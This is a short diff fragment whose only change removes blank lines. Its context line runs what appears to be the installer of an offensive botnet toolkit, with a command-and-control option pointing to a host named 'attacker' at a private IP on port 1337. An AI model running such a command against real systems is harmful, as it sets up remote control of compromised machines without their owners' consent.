@@ -2,5 +2,3 @@
 
 ./instal/byob.sh -cc attacker 10.10.10.1 1337
 
-
-
